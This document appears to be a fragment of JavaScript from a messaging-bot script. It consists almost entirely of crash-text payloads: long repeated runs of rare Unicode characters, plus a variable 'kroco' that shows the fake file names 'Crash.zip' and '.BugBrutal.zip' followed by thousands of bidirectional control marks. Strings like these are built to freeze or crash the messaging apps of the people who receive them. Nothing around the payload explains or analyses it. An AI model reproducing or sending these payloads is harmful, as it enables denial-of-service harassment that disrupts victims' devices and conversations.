࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬`
  
  let kroco = `📄Crash.zip                                                             📄.BugBrutal.zip                                                                  
★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎